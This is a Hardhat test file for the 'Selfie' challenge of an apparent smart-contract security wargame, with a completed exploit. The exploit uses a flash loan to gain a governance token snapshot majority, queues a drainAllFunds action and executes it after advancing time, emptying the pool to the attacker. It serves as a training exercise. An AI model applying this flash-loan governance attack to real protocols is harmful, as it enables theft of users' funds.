const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // Deploy attacker contract
        //Take flashloan
        // Take a snapshot by calling DamnValuableTokenSnapshot.snapshot()
        //Return flash loan
        const SelfieAttackerFactory = await ethers.getContractFactory('SelfieAttacker', attacker)
        const selfieAttacker = await SelfieAttackerFactory.deploy(this.governance.address, this.pool.address)
        await selfieAttacker.getLoan(TOKENS_IN_POOL);
        expect(await this.token.getBalanceAtLastSnapshot(selfieAttacker.address)).to.be.equal(TOKENS_IN_POOL)

        // Generate callData offline 
        // Call queue action on SelfieAttacker contract
        // Move EVM time to 2 days ahead.
        // Call execute action on the governance contract 
        const poolIface = new ethers.utils.Interface([
            "function drainAllFunds(address receiver) external",
        ])
        const callData = poolIface.encodeFunctionData("drainAllFunds", [attacker.address])
        const tx = await selfieAttacker.queueAction(callData);
        const receipt = await tx.wait(1);
        actionId = receipt.events[1].topics[1]

        // Advance time 2 days so that governance can execute function
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
        await this.governance.connect(attacker).executeAction(actionId);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
